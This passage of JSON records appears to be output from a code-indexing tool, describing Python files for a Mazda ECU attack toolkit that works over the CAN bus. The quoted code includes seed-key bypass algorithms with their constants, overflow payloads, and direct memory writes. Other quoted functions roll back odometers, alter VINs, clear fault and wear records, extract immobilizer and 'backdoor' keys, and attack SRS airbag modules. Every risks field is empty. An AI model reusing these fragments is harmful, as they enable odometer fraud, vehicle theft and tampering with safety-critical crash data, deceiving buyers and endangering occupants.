"security_pattern", "line": 185, "pattern": "seed", "content": "def _calculate_srs_key(self, seed: str) -> str:"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "\"\"\"CALCULATE SRS SECURITY KEY\"\"\""}, {"type": "security_pattern", "line": 187, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 188, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 193, "pattern": "seed", "content": "temp = ((seed_bytes[i] << 3) | (seed_bytes[i] >> 5)) & 0xFF"}, {"type": "security_pattern", "line": 197, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 199, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 201, "pattern": "key", "content": "def _test_srs_key(self, seed: str, key: str) -> bool:"}, {"type": "security_pattern", "line": 201, "pattern": "seed", "content": "def _test_srs_key(self, seed: str, key: str) -> bool:"}, {"type": "security_pattern", "line": 202, "pattern": "key", "content": "\"\"\"TEST SRS SECURITY KEY\"\"\""}, {"type": "security_pattern", "line": 206, "pattern": "key", "content": "payload.append(0x02)  # Send Key"}, {"type": "security_pattern", "line": 207, "pattern": "key", "content": "payload.extend(bytes.fromhex(key))"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts3.py", "lines_read": 840, "features_found": [{"type": "function", "name": "demonstrate_eeprom_exploits", "line": 723}, {"type": "function", "name": "__init__", "line": 30}, {"type": "function", "name": "connect_can", "line": 53}, {"type": "function", "name": "unlock_eeprom_security", "line": 65}, {"type": "function", "name": "_eeprom_manufacturer_mode", "line": 85}, {"type": "function", "name": "_eeprom_checksum_", "line": 119}, {"type": "function", "name": "_calculate_checksum", "line": 152}, {"type": "function", "name": "_eeprom_bootloader_exploit", "line": 162}, {"type": "function", "name": "_eeprom_dma_attack", "line": 204}, {"type": "function", "name": "_test_eeprom_write", "line": 232}, {"type": "function", "name": "reset_flash_counter", "line": 250}, {"type": "function", "name": "modify_vin_number", "line": 277}, {"type": "function", "name": "_update_vin_checksum", "line": 309}, {"type": "function", "name": "adjust_odometer", "line": 323}, {"type": "function", "name": "reset_adaptation_data", "line": 356}, {"type": "function", "name": "clear_fault_history", "line": 383}, {"type": "function", "name": "reset_operating_hours", "line": 410}, {"type": "function", "name": "extract_security_keys", "line": 436}, {"type": "function", "name": "backup_tuning_maps", "line": 465}, {"type": "function", "name": "restore_tuning_maps", "line": 489}, {"type": "function", "name": "_direct_memory_write", "line": 512}, {"type": "function", "name": "_direct_memory_read", "line": 547}, {"type": "function", "name": "dump_complete_eeprom", "line": 590}, {"type": "function", "name": "write_complete_eeprom", "line": 622}, {"type": "function", "name": "__init__", "line": 657}, {"type": "function", "name": "reset_turbo_wear_counters", "line": 660}, {"type": "function", "name": "reset_clutch_wear_counters", "line": 680}, {"type": "function", "name": "reset_fuel_system_wear", "line": 701}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "binascii", "line": null}], "components_found": [{"type": "class", "name": "EEPROMPatch", "line": 17}, {"type": "class", "name": "EEPROMExploiter", "line": 24}, {"type": "class", "name": "ComponentWearReset", "line": 651}], "algorithms": [{"type": "algorithm_function", "line": 152, "content": "def _calculate_checksum(self, data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "'vin_storage': 0x00000,"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "'odometer': 0x00020,"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "'ecu_serial': 0x00040,"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "'flash_counter': 0x00060,"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "'tuning_checksum': 0x00080,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_keys': 0x00100,"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "'adaptation_data': 0x00200,"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "'fault_history': 0x00300,"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "'operating_hours': 0x00400,"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "'component_wear': 0x00500,"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "'tuning_maps_backup': 0x01000,"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "'calibration_data': 0x02000,"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "'bootloader_region': 0x0F000"}, {"type": "protocol", "line": 54, "protocol": "CAN", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "protocol", "line": 62, "protocol": "CAN", "content": "print(f\"EEPROM CAN connection failed: {e}\")"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.data[0] == 0x7F:"}, {"type": "protocol", "line": 128, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self._direct_memory_write(0xFFFF00, checksum_patch)"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "current_data = self._read_eeprom_block(0x00000, 0x1000)"}, {"type": "protocol", "line": 158, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + word) & 0xFFFF"}, {"type": "protocol", "line": 171, "protocol": "0x[0-9A-Fa-f]+", "content": "b'\\x34' + b'A' * 100 + struct.pack('>I', 0x00000),"}, {"type": "protocol", "line": 173, "protocol": "0x[0-9A-Fa-f]+", "content": "b'\\x36\\x00\\x00\\x00\\x00;writemem 0x00000',"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 212, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable DMA"}, {"type": "protocol", "line": 213, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x81, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00]),  #  protection"}, {"type": "protocol", "line": 214, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Memory unlock"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "test_address = 0x0FFF0"}, {"type": "protocol", "line": 317, "protocol": "0x[0-9A-Fa-f]+", "content": "self.eeprom_map['vin_storage'] + 0x20,"}, {"type": "protocol", "line": 343, "protocol": "0x[0-9A-Fa-f]+", "content": "self.eeprom_map['odometer'] + 0x10,"}, {"type": "protocol", "line": 366, "protocol": "0x[0-9A-Fa-f]+", "content": "adaptation_size = 0x200  # 512 bytes"}, {"type": "protocol", "line": 393, "protocol": "0x[0-9A-Fa-f]+", "content": "fault_size = 0x100  # 256 bytes"}, {"type": "protocol", "line": 477, "protocol": "0x[0-9A-Fa-f]+", "content": "0x1000  # 4KB backup region"}, {"type": "protocol", "line": 520, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x3D)  # WriteMemoryByAddress"}, {"type": "protocol", "line": 530, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 533, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 542, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x7D"}, {"type": "protocol", "line": 554, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)  # ReadMemoryByAddress"}, {"type": "protocol", "line": 563, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 566, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 580, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.arbitration_id == 0x7E8:"}, {"type": "protocol", "line": 599, "protocol": "0x[0-9A-Fa-f]+", "content": "eeprom_size = 0x10000  # 64KB typical EEPROM size"}, {"type": "protocol", "line": 603, "protocol": "0x[0-9A-Fa-f]+", "content": "chunk_size = 0x400  # 1KB chunks"}, {"type": "protocol", "line": 632, "protocol": "0x[0-9A-Fa-f]+", "content": "chunk_size = 0x400  # 1KB chunks"}, {"type": "protocol", "line": 684, "protocol": "0x[0-9A-Fa-f]+", "content": "clutch_address = self.exploiter.eeprom_map['component_wear'] + 0x20"}, {"type": "protocol", "line": 705, "protocol": "0x[0-9A-Fa-f]+", "content": "fuel_address = self.exploiter.eeprom_map['component_wear'] + 0x40"}, {"type": "protocol", "line": 734, "protocol": "CAN", "content": "print(\"EEPROM CAN connection failed - using simulated mode\")"}], "hardware_assumptions": [{"type": "hardware", "line": 40, "hardware": "ECU", "content": "'ecu_serial': 0x00040,"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "'security_keys': 0x00100,"}, {"type": "hardware", "line": 54, "hardware": "CAN bus", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "def unlock_eeprom_security(self) -> bool:"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "Multiple methods for different security levels"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "security_methods = ["}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "for method in security_methods:"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "print(\"EEPROM security \")"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "normal security through low-level access"}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "RESET ECU FLASH COUNTER"}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "Clears record of how many times ECU has been reprogrammed"}, {"type": "hardware", "line": 436, "hardware": "ECU", "content": "def extract_security_keys(self) -> Optional[Dict[str, str]]:"}, {"type": "hardware", "line": 438, "hardware": "ECU", "content": "EXTRACT SECURITY KEYS FROM EEPROM"}, {"type": "hardware", "line": 439, "hardware": "ECU", "content": "Retrieves immobilizer, seed-key, and other security data"}, {"type": "hardware", "line": 439, "hardware": "immobilizer", "content": "Retrieves immobilizer, seed-key, and other security data"}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "key_data = self._direct_memory_read(self.eeprom_map['security_keys'], 64)"}, {"type": "hardware", "line": 453, "hardware": "immobilizer", "content": "keys['immobilizer_key'] = key_data[0:8].hex().upper()"}, {"type": "hardware", "line": 454, "hardware": "ECU", "content": "keys['ecu_seed_key'] = key_data[8:16].hex().upper()"}, {"type": "hardware", "line": 455, "hardware": "ECU", "content": "keys['tcm_security'] = key_data[16:24].hex().upper()"}, {"type": "hardware", "line": 455, "hardware": "TCM", "content": "keys['tcm_security'] = key_data[16:24].hex().upper()"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "print(\"Security keys extracted from EEPROM\")"}, {"type": "hardware", "line": 462, "hardware": "ECU", "content": "print(f\"Security key extraction failed: {e}\")"}, {"type": "hardware", "line": 515, "hardware": "ECU", "content": "Low-level write operation  normal security"}, {"type": "hardware", "line": 738, "hardware": "ECU", "content": "print(\"\\n1. EEPROM SECURITY \")"}, {"type": "hardware", "line": 741, "hardware": "ECU", "content": "eeprom_unlocked = eeprom_.ueprom_security()"}, {"type": "hardware", "line": 742, "hardware": "ECU", "content": "print(f\"EEPROM Security: {'' if eeprom_unlocked else 'FAILED'}\")"}, {"type": "hardware", "line": 783, "hardware": "ECU", "content": "print(\"\\n5. SECURITY KEY EXTRACTION\")"}, {"type": "hardware", "line": 787, "hardware": "ECU", "content": "security_keys = eeprom_.extract_security_keys()"}, {"type": "hardware", "line": 788, "hardware": "ECU", "content": "if security_keys:"}, {"type": "hardware", "line": 789, "hardware": "ECU", "content": "print(\"Security Keys Extracted:\")"}, {"type": "hardware", "line": 790, "hardware": "ECU", "content": "for key_type, key_value in security_keys.items():"}, {"type": "hardware", "line": 827, "hardware": "ECU", "content": "'eeprom_security': 'COMPROMISED' if eeprom_unlocked else 'INTACT',"}, {"type": "hardware", "line": 832, "hardware": "ECU", "content": "'security_keys': 'EXTRACTED' if eeprom_unlocked else 'PROTECTED'"}, {"type": "hardware", "line": 835, "hardware": "ECU", "content": "print(\"\\nEEPROM SECURITY ASSESSMENT:\")"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 43, "pattern": "key", "content": "'security_keys': 0x00100,"}, {"type": "security_pattern", "line": 436, "pattern": "key", "content": "def extract_security_keys(self) -> Optional[Dict[str, str]]:"}, {"type": "security_pattern", "line": 438, "pattern": "key", "content": "EXTRACT SECURITY KEYS FROM EEPROM"}, {"type": "security_pattern", "line": 439, "pattern": "key", "content": "Retrieves immobilizer, seed-key, and other security data"}, {"type": "security_pattern", "line": 439, "pattern": "seed", "content": "Retrieves immobilizer, seed-key, and other security data"}, {"type": "security_pattern", "line": 446, "pattern": "key", "content": "key_data = self._direct_memory_read(self.eeprom_map['security_keys'], 64)"}, {"type": "security_pattern", "line": 447, "pattern": "key", "content": "if not key_data:"}, {"type": "security_pattern", "line": 450, "pattern": "key", "content": "keys = {}"}, {"type": "security_pattern", "line": 453, "pattern": "key", "content": "keys['immobilizer_key'] = key_data[0:8].hex().upper()"}, {"type": "security_pattern", "line": 454, "pattern": "key", "content": "keys['ecu_seed_key'] = key_data[8:16].hex().upper()"}, {"type": "security_pattern", "line": 454, "pattern": "seed", "content": "keys['ecu_seed_key'] = key_data[8:16].hex().upper()"}, {"type": "security_pattern", "line": 455, "pattern": "key", "content": "keys['tcm_security'] = key_data[16:24].hex().upper()"}, {"type": "security_pattern", "line": 456, "pattern": "key", "content": "keys['backdoor_codes'] = key_data[24:32].hex().upper()"}, {"type": "security_pattern", "line": 458, "pattern": "key", "content": "print(\"Security keys extracted from EEPROM\")"}, {"type": "security_pattern", "line": 459, "pattern": "key", "content": "return keys"}, {"type": "security_pattern", "line": 462, "pattern": "key", "content": "print(f\"Security key extraction failed: {e}\")"}, {"type": "security_pattern", "line": 783, "pattern": "key", "content": "print(\"\\n5. SECURITY KEY EXTRACTION\")"}, {"type": "security_pattern", "line": 787, "pattern": "key", "content": "security_keys = eeprom_.extract_security_keys()"}, {"type": "security_pattern", "line": 788, "pattern": "key", "content": "if security_keys:"}, {"type": "security_pattern", "line": 789, "pattern": "key", "content": "print(\"Security Keys Extracted:\")"}, {"type": "security_pattern", "line": 790, "pattern": "key", "content": "for key_type, key_value in security_keys.items():"}, {"type": "security_pattern", "line": 791, "pattern": "key", "content": "print(f\"  {key_type}: {key_value[:16]}...\")"}, {"type": "security_pattern", "line": 832, "pattern": "key", "content": "'security_keys': 'EXTRACTED' if eeprom_unlocked else 'PROTECTED'"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts4.py", "lines_read": 1236, "features_found": [{"type": "function", "name": "__init__", "line": 48}, {"type": "function", "name": "_mazda_m12r_algorithm", "line": 66}, {"type": "function", "name": "_tcm_xor_algorithm", "line": 76}, {"type": "function", "name": "_immobilizer_3des", "line": 85}, {"type": "function", "name": "_srs_enhanced_algorithm", "line": 93}, {"type": "function", "name": "__init__", "line": 111}, {"type": "function", "name": "__init__", "line": 187}, {"type": "function", "name": "__init__", "line": 259}, {"type": "function", "name": "_predict_seed", "line": 304}, {"type": "function", "name": "__init__", "line": 347}, {"type": "function", "name": "forward", "line": 362}, {"type": "function", "name": "__init__", "line": 368}, {"type": "function", "name": "optimize_parameters", "line": 378}, {"type": "function", "name": "_extract_features", "line": 397}, {"type": "function", "name": "_apply_safety_limits", "line": 418}, {"type": "function", "name": "__init__", "line": 441}, {"type": "function", "name": "_derive_key", "line": 446}, {"type": "function", "name": "_init_database", "line": 456}, {"type": "function", "name": "get_connection", "line": 508}, {"type": "function", "name": "encrypt_data", "line": 516}, {"type": "function", "name": "decrypt_data", "line": 521}, {"type": "function", "name": "__init__", "line": 533}, {"type": "function", "name": "setup_routes", "line": 541}, {"type": "function", "name": "_generate_ignition_map", "line": 675}, {"type": "function", "name": "_generate_fuel_map", "line": 696}, {"type": "function", "name": "_generate_boost_map", "line": 722}, {"type": "function", "name": "_generate_vvt_map", "line": 746}, {"type": "function", "name": "_apply_modification_adjustments", "line": 766}, {"type": "function", "name": "__init__", "line": 794}, {"type": "function", "name": "setup_static_files", "line": 798}, {"type": "function", "name": "test_security_algorithms", "line": 1141}, {"type": "function", "name": "test_eeprom_operations", "line": 1156}, {"type": "function", "name": "test_ai_tuning", "line": 1169}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "logging.handlers", "line": null}, {"type": "import", "module": "contextlib", "line": null}, {"type": "import", "module": "aiohttp", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "interpolate", "line": null}, {"type": "import", "module": "torch", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "RotatingFileHandler", "line": null}, {"type": "import", "module": "sqlite3", "line": null}, {"type": "import", "module": "contextmanager", "line": null}, {"type": "import", "module": "aiohttp", "line": null}, {"type": "import", "module": "web", "line": null}, {"type": "import", "module": "jwt", "line": null}, {"type": "import", "module": "bcrypt", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "docker", "line": null}, {"type": "import", "module": "pytest", "line": null}, {"type": "import", "module": "multiprocessing", "line": null}], "components_found": [{"type": "class", "name": "MazdaSecurityCore", "line": 45}, {"type": "class", "name": "MazdaCANEngine", "line": 108}, {"type": "class", "name": "EEPROMExploiter", "line": 184}, {"type": "class", "name": "SRSAirbagExploiter", "line": 256}, {"type": "class", "name": "AITuningModel", "line": 344}, {"type": "class", "name": "RealTimeAITuner", "line": 365}, {"type": "class", "name": "SecureDatabase", "line": 438}, {"type": "class", "name": "MazdaTunerAPI", "line": 530}, {"type": "class", "name": "MazdaTunerFrontend", "line": 791}, {"type": "class", "name": "TestMazdaTuner", "line": 1138}, {"type": "class", "name": "MockCANEngine", "line": 1159}], "algorithms": [{"type": "algorithm_function", "line": 66, "content": "def _mazda_m12r_algorithm(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 76, "content": "def _tcm_xor_algorithm(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 93, "content": "def _srs_enhanced_algorithm(self, seed: bytes) -> bytes:"}, {"type": "algorithm_function", "line": 446, "content": "def _derive_key(self, password: str) -> bytes:"}, {"type": "algorithm_function", "line": 1141, "content": "def test_security_algorithms(self):"}], "protocols": [{"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed[i] ^ 0x73"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((seed[i] << 3) | (seed[i] >> 5)) & 0xFF"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= 0xB5"}, {"type": "protocol", "line": 99, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2A) & 0xFF"}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= (0xDE + i)"}, {"type": "protocol", "line": 108, "protocol": "CAN", "content": "class MazdaCANEngine:"}, {"type": "protocol", "line": 109, "protocol": "CAN", "content": "\"\"\"LOW-LEVEL CAN BUS COMMUNICATION - DIRECT ECU ACCESS\"\"\""}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine': 0x7E0,"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm': 0x7E1,"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs': 0x7E2,"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "'srs': 0x750,"}, {"type": "protocol", "line": 119, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster': 0x7E4,"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer': 0x7E5"}, {"type": "protocol", "line": 126, "protocol": "CAN", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "protocol", "line": 136, "protocol": "CAN", "content": "logging.error(f\"CAN connection failed: {e}\")"}, {"type": "protocol", "line": 150, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 169, "protocol": "CAN", "content": "\"\"\"RECEIVE CAN RESPONSE WITH TIMEOUT\"\"\""}, {"type": "protocol", "line": 174, "protocol": "0x[0-9A-Fa-f]+", "content": "if message and message.arbitration_id == 0x7E8:  # ECU response ID"}, {"type": "protocol", "line": 187, "protocol": "CAN", "content": "def __init__(self, can_engine: MazdaCANEngine):"}, {"type": "protocol", "line": 190, "protocol": "0x[0-9A-Fa-f]+", "content": "'vin': 0x00000,"}, {"type": "protocol", "line": 191, "protocol": "0x[0-9A-Fa-f]+", "content": "'odometer': 0x00020,"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "'flash_counter': 0x00060,"}, {"type": "protocol", "line": 193, "protocol": "0x[0-9A-Fa-f]+", "content": "'tuning_checksum': 0x00080,"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_keys': 0x00100,"}, {"type": "protocol", "line": 195, "protocol": "0x[0-9A-Fa-f]+", "content": "'adaptation_data': 0x00200,"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "'fault_history': 0x00300,"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "'operating_hours': 0x00400,"}, {"type": "protocol", "line": 198, "protocol": "0x[0-9A-Fa-f]+", "content": "'component_wear': 0x00500"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('engine', 0x3D, code_bytes)"}, {"type": "protocol", "line": 220, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x7F:"}, {"type": "protocol", "line": 228, "protocol": "0x[0-9A-Fa-f]+", "content": "return await self._write_memory(0xFFFF00, patch_data)"}, {"type": "protocol", "line": 232, "protocol": "0x[0-9A-Fa-f]+", "content": "exploit_payload = b'\\x34' + b'A' * 100 + struct.pack('>I', 0x00000)"}, {"type": "protocol", "line": 233, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('engine', 0x34, exploit_payload[:7])"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response[0] == 0x74"}, {"type": "protocol", "line": 249, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('engine', 0x3D, payload[:7])"}, {"type": "protocol", "line": 250, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response[0] == 0x7D"}, {"type": "protocol", "line": 259, "protocol": "CAN", "content": "def __init__(self, can_engine: MazdaCANEngine):"}, {"type": "protocol", "line": 282, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('srs', 0x27, code_bytes)"}, {"type": "protocol", "line": 283, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x7F:"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('srs', 0x27, b'\\x01')"}, {"type": "protocol", "line": 292, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x67:"}, {"type": "protocol", "line": 300, "protocol": "0x[0-9A-Fa-f]+", "content": "key_response = await self.can.send_diagnostic_request('srs', 0x27, b'\\x02' + key)"}, {"type": "protocol", "line": 301, "protocol": "0x[0-9A-Fa-f]+", "content": "return key_response is not None and key_response[0] == 0x67"}, {"type": "protocol", "line": 309, "protocol": "0x[0-9A-Fa-f]+", "content": "next_seed = (seed_ints[-1] + diff) & 0xFFFFFFFF"}, {"type": "protocol", "line": 316, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('srs', 0x27, overflow[:7])"}, {"type": "protocol", "line": 326, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xF10000, 256),  # Crash sensor data"}, {"type": "protocol", "line": 327, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xF10100, 64),   # Deployment counters"}, {"type": "protocol", "line": 328, "protocol": "0x[0-9A-Fa-f]+", "content": "(0xF10600, 512),  # Crash history"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('srs', 0x3D, payload[:7])"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x7D:"}, {"type": "protocol", "line": 536, "protocol": "CAN", "content": "self.can_engine = MazdaCANEngine()"}, {"type": "protocol", "line": 601, "protocol": "CAN", "content": "'message': 'CAN bus connection failed'"}, {"type": "protocol", "line": 620, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_response = await self.can_engine.send_diagnostic_request('engine', 0x27, b'\\x01')"}, {"type": "protocol", "line": 621, "protocol": "0x[0-9A-Fa-f]+", "content": "if not seed_response or seed_response[0] != 0x67:"}, {"type": "protocol", "line": 629, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine', 0x27, b'\\x02' + calculated_key"}, {"type": "protocol", "line": 632, "protocol": "0x[0-9A-Fa-f]+", "content": "return key_response is not None and key_response[0] == 0x67"}, {"type": "protocol", "line": 1068, "protocol": "CAN", "content": "- /dev:/dev:rw  # CAN bus device access"}, {"type": "protocol", "line": 1070, "protocol": "CAN", "content": "- CAN_INTERFACE=can0"}, {"type": "protocol", "line": 1074, "protocol": "CAN", "content": "privileged: true  # Required for CAN bus access"}, {"type": "protocol", "line": 1159, "protocol": "CAN", "content": "class MockCANEngine:"}, {"type": "protocol", "line": 1163, "protocol": "CAN", "content": "can_engine = MockCANEngine()"}], "hardware_assumptions": [{"type": "hardware", "line": 45, "hardware": "ECU", "content": "class MazdaSecurityCore:"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"\"\"FACTORY SECURITY BYPASS ENGINE - ALL MAZDA ALGORITHMS IMPLEMENTED\"\"\""}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "'security_reset': \"SEC-RES-MAZDA-2024\","}, {"type": "hardware", "line": 54, "hardware": "SRS", "content": "'srs_override': \"SRS-TECH-ACCESS-2024\","}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "'ecu_m12r_v3_4': self._mazda_m12r_algorithm,"}, {"type": "hardware", "line": 61, "hardware": "TCM", "content": "'tcm_simple_xor': self._tcm_xor_algorithm,"}, {"type": "hardware", "line": 62, "hardware": "immobilizer", "content": "'immobilizer_3des': self._immobilizer_3des,"}, {"type": "hardware", "line": 63, "hardware": "SRS", "content": "'srs_enhanced': 